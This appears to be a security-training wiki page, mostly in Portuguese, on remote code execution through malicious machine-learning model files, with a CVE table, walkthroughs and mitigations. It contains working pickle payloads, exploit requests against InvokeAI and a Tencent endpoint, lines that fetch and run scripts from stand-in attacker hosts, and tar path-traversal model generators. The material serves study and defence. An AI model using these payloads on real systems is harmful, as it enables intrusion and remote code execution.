# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Modelos de Machine Learning são geralmente compartilhados em diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Esses modelos podem ser carregados nas máquinas dos desenvolvedores ou em sistemas de produção para serem utilizados. Geralmente os modelos não deveriam conter código malicioso, mas existem alguns casos onde o modelo pode ser usado para executar código arbitrário no sistema como funcionalidade intencional ou devido a uma vulnerabilidade na biblioteca de carregamento de modelos.

No momento da escrita, estes são alguns exemplos desse tipo de vulnerabilidades:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Pickle malicioso em checkpoint de modelo leva à execução de código (contornando a salvaguarda `weights_only`)                            | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download de modelo malicioso causa execução de código; RCE por desserialização Java na API de gerenciamento                      | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Checkpoint não confiável dispara pickle reducer durante `load_model_trainer_states_from_checkpoint` → execução de código no worker ML    | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Carregar modelo a partir de YAML usa `yaml.unsafe_load` (execução de código) <br> Carregar modelo com camada **Lambda** executa código Python arbitrário | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Modelo `.tflite` forjado dispara overflow inteiro → corrupção de heap (potencial RCE)                                                   | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Carregar um modelo via `joblib.load` executa pickle com payload do atacante em `__reduce__`                                            | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` por padrão permitia arrays de objetos pickled – `.npy/.npz` maliciosos disparam execução de código                         | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | O caminho de external-weights do modelo ONNX pode escapar do diretório (leitura de arquivos arbitrários) <br> Tar de modelo ONNX malicioso pode sobrescrever arquivos arbitrários (levando a RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Modelo com operador custom exige carregar código nativo do atacante; grafos de modelo complexos abusam da lógica para executar cálculos não intencionais | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Usar API de carregamento de modelo com `--model-control` habilitado permite traversal de caminho relativo para escrever arquivos (ex.: sobrescrever `.bashrc` para RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Arquivo de modelo GGUF malformado causa estouros de buffer no parser, permitindo execução de código arbitrário no sistema da vítima     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Modelo HDF5 (`.h5`) malicioso com camada Lambda ainda executa ao carregar (Keras safe_mode não cobre formato antigo – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Muitas ferramentas de ML (ex.: formatos baseados em pickle, `pickle.load` do Python) irão executar código arbitrário embutido em arquivos de modelo, a menos que mitigado | |

Além disso, existem alguns modelos baseados em pickle Python como os usados por [PyTorch](https://github.com/pytorch/pytorch/security) que podem ser usados para executar código arbitrário no sistema se não forem carregados com `weights_only=True`. Portanto, qualquer modelo baseado em pickle pode ser especialmente suscetível a esse tipo de ataque, mesmo que não esteja listado na tabela acima.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` é uma interface web open-source popular para Stable-Diffusion. Versões **5.3.1 – 5.4.2** expõem o endpoint REST `/api/v2/models/install` que permite aos usuários baixar e carregar modelos a partir de URLs arbitrárias.

Internamente, o endpoint eventualmente chama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando o arquivo fornecido é um **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**. Como o conteúdo vem diretamente de uma URL controlada pelo usuário, um atacante pode embutir um objeto malicioso com um método customizado `__reduce__` dentro do checkpoint; o método é executado **during deserialization**, levando a **remote code execution (RCE)** no InvokeAI server.

A vulnerabilidade recebeu a identificação **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Crie um checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hospede `payload.ckpt` em um servidor HTTP que você controla (por exemplo `http://ATTACKER/payload.ckpt`).
3. Acione o endpoint vulnerável (não exige autenticação):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. When InvokeAI downloads the file it calls `torch.load()` → the `os.system` gadget runs and the attacker gains code execution in the context of the InvokeAI process.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (opção scan padrão **false**)  
•  `/api/v2/models/install` acessível pelo atacante  
•  O processo tem permissões para executar comandos de shell

#### Mitigations

* Atualize para **InvokeAI ≥ 5.4.3** – o patch configura `scan=True` por padrão e realiza a verificação de malware antes da desserialização.  
* Ao carregar checkpoints programaticamente use `torch.load(file, weights_only=True)` ou o novo [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Implemente allow-lists / assinaturas para as fontes de modelos e execute o serviço com privilégios mínimos.

> ⚠️ Lembre-se que **qualquer** formato baseado em Python pickle (incluindo muitos `.pt`, `.pkl`, `.ckpt`, `.pth` files) é inerentemente inseguro para desserializar a partir de fontes não confiáveis.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via `torch.load` inseguro (CVE-2025-23298)

O Transformers4Rec da NVIDIA (parte do Merlin) expôs um carregador de checkpoints inseguro que chamava diretamente `torch.load()` em caminhos fornecidos pelo usuário. Como `torch.load` depende de Python `pickle`, um checkpoint controlado por um atacante pode executar código arbitrário via um reducer durante a desserialização.

Caminho vulnerável (antes da correção): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por que isso leva a RCE: no Python pickle, um objeto pode definir um reducer (`__reduce__`/`__setstate__`) que retorna um callable e argumentos. O callable é executado durante o unpickling. Se tal objeto estiver presente em um checkpoint, ele é executado antes de quaisquer weights serem usados.

Exemplo mínimo de checkpoint malicioso:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vetores de entrega e blast radius:
- Trojanized checkpoints/models compartilhados via repos, buckets, ou artifact registries
- Pipelines automatizados de resume/deploy que auto-load checkpoints
- A execução ocorre dentro de training/inference workers, muitas vezes com privilégios elevados (ex.: root em containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) substituiu o `torch.load()` direto por um desserializador restrito, com allow-list, implementado em `transformers4rec/utils/serialization.py`. O novo loader valida tipos/campos e previne que callables arbitrários sejam invocados durante o load.

Orientações defensivas específicas para PyTorch checkpoints:
- Não unpickle dados não confiáveis. Prefira formatos não-executáveis como [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX quando possível.
- Se precisar usar PyTorch serialization, garanta `weights_only=True` (suportado em versões mais recentes do PyTorch) ou use um unpickler customizado com allow-list similar ao patch do Transformers4Rec.
- Imponha proveniência/assinaturas do modelo e desserialização em sandbox (seccomp/AppArmor; usuário não-root; FS restrito e sem egress de rede).
- Monitore por processos filho inesperados dos serviços de ML no momento do carregamento do checkpoint; trace o uso de `torch.load()`/`pickle`.

POC e referências de vulnerável/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Exemplo – criando um modelo PyTorch malicioso

- Crie o modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carregar o modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Desserialização Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

O FaceDetection-DSFD da Tencent expõe um endpoint `resnet` que desserializa dados controlados pelo usuário. O ZDI confirmou que um atacante remoto pode coagir uma vítima a carregar uma página/arquivo malicioso, fazer com que ela envie um blob serializado especialmente criado para esse endpoint e acionar a desserialização como `root`, levando ao comprometimento total.

O fluxo do exploit espelha o abuso típico de pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## Modelos para Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, com o código a seguir, você pode criar um modelo que criará um symlink para o diretório `/tmp` quando for carregado:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Análise aprofundada: Keras .keras deserialization and gadget hunting

Para um guia focado sobre .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, e post-fix gadget discovery dentro da allowlist, veja:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referências

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
